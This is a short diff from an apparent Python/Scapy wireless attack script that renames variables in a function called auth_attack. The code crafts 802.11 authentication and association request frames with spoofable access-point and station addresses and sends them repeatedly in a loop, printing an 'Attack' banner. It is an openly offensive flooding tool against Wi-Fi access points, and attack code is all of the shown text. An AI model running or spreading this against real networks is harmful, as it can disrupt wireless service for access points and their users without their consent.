@@ -23,20 +23,20 @@ def auth_attack():
     show_info()
 
     # Authentication
-    frame1 = RadioTap()\
+    auth_frame = RadioTap()\
         /Dot11(type=0, subtype=11, addr1=ap, addr2=sta, addr3=ap)\
         /Dot11Auth(algo=ALGO_OPEN_AUTH, seqnum=START_SEQNUM)
  
     # Association
-    frame2 = RadioTap()\
+    assoc_frame = RadioTap()\
         /Dot11(type=0, subtype=0, addr1=ap, addr2=sta, addr3=ap)\
         /Dot11AssoReq()\
         /Dot11Elt(ID='SSID', info=ssid)
     
     print(WARN_STR+" Attack")
     for i in range(0,30):
-        sendp(frame1, iface=iface)
-        sendp(frame2, iface=iface)
+        sendp(auth_frame, iface=iface)
+        sendp(assoc_frame, iface=iface)
         print("\x1b[36m->\x1b[0m",end="",flush=True)
 
 def channel_switch(iface,ch):
